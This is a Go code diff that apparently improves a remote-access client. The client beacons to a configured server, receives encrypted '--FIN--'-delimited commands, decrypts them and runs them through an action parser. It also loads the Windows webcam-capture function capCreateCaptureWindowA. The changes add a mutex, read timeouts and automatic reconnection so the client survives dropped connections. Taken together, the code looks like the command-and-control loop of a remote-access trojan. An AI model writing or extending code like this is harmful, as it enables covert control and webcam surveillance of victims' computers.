@@ -62,6 +62,8 @@ var (
 		(6 * 60 * 1000),
 	}
 
+	mutex sync.Mutex
+
 	avicap32                = windows.NewLazySystemDLL("avicap32.dll")
 	capCreateCaptureWindowA = avicap32.NewProc("capCreateCaptureWindowA")
 
@@ -159,8 +161,8 @@ func WriteLog(message string, v ...any) {
 	logStream.Printf("%s\n", message)
 }
 
-func GetSessionID() error {
-	fullAddress := client.LocalAddr().String()
+func GetSessionID(conn net.Conn) error {
+	fullAddress := conn.LocalAddr().String()
 
 	// Split IP address and port
 	addrParts := strings.Split(fullAddress, ":")
@@ -666,66 +668,104 @@ func ParseAction(action string) error {
 	return nil
 }
 
-func HandleConnection(conn net.Conn) error {
+func HandleConnection(conn net.Conn) {
 	reader := bufio.NewReader(conn)
-	var fullData bytes.Buffer
+	var buffer bytes.Buffer
 
 	for {
+		if exitProcess {
+			return
+		}
+
+		// Set a read deadline to prevent blocking indefinitely
+		conn.SetReadDeadline(time.Now().Add(100 * time.Millisecond))
+
 		chunk := make([]byte, 1024)
 		n, err := reader.Read(chunk)
+
 		if err != nil {
-			if err != io.EOF {
-				exitProcess = true
-				return fmt.Errorf("connection read error: %v", err)
+			if err == io.EOF {
+				WriteLog("Connection closed by server")
+				return
+			} else if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
+				// This is just a timeout, not a real error
+				continue
+			} else {
+				WriteLog("Error reading from connection: %v", err)
+				return
 			}
-			break
 		}
-		fullData.Write(chunk[:n])
-		if bytes.Contains(fullData.Bytes(), []byte("--FIN--")) {
-			break
+
+		if n > 0 {
+			buffer.Write(chunk[:n])
+
+			for {
+				index := bytes.Index(buffer.Bytes(), []byte("--FIN--"))
+				if index == -1 {
+					break
+				}
+
+				data := buffer.Bytes()[:index]
+				buffer.Next(index + 6) // 6 is the length of "--FIN--"
+
+				if len(data) > 0 {
+					WriteLog("Received Data: %s...", string(data)[:100])
+					action, err := DecryptData(string(data), sessionId)
+					if err != nil {
+						WriteLog("DecryptData error: %v", err)
+					} else if action != "" {
+						if err := ParseAction(action); err != nil {
+							WriteLog("Error parsing action: %v", err)
+						}
+					}
+				}
+			}
 		}
 	}
-
-	if exitProcess {
-		return nil
-	}
-
-	WriteLog("Received Data: %s", fullData.String())
-	return nil
 }
 
 func ConnectToServer() {
 	for !exitProcess {
+		mutex.Lock()
 		if client == nil {
-			// Connect to the server
 			conn, err := net.Dial("tcp", address+":"+port)
 			if err != nil {
 				WriteLog("Connection error: %v", err)
-				exitProcess = true
+				mutex.Unlock()
+				time.Sleep(5 * time.Second) // Wait before retrying
+				continue
 			}
-			defer conn.Close()
-			WriteLog("Client " + CVER + " connected.")
 			client = conn
-			client.SetDeadline(time.Time{})
-			client.SetReadDeadline(time.Time{})
-			client.SetWriteDeadline(time.Time{})
+			WriteLog("Client %s connected.", CVER)
 		}
-		if len(sessionId) == 0 {
-			err := GetSessionID()
-			if err != nil {
+		mutex.Unlock()
+
+		if sessionId == "" {
+			if err := GetSessionID(client); err != nil {
 				WriteLog("Error getting SessionID: %v", err)
 			}
 		}
+
 		if !sentFirstBeacon {
-			err := SendBeacon() // Send a beacon
-			if err != nil {
+			if err := SendBeacon(); err != nil {
 				WriteLog("Error sending beacon: %v", err)
+			} else {
+				sentFirstBeacon = true
 			}
-			sentFirstBeacon = true
 		}
-		err := HandleConnection(client)
-		if err != nil {
-			WriteLog("Error in HandleConnection: %v", err)
+
+		HandleConnection(client)
+
+		mutex.Lock()
+		if client != nil {
+			client.Close()
+			client = nil
+		}
+		mutex.Unlock()
+
+		if !exitProcess {
+			WriteLog("Connection lost. Attempting to reconnect...")
+			time.Sleep(5 * time.Second) // Wait before reconnecting
 		}
 	}
 	WriteLog("Connection to server closing.")
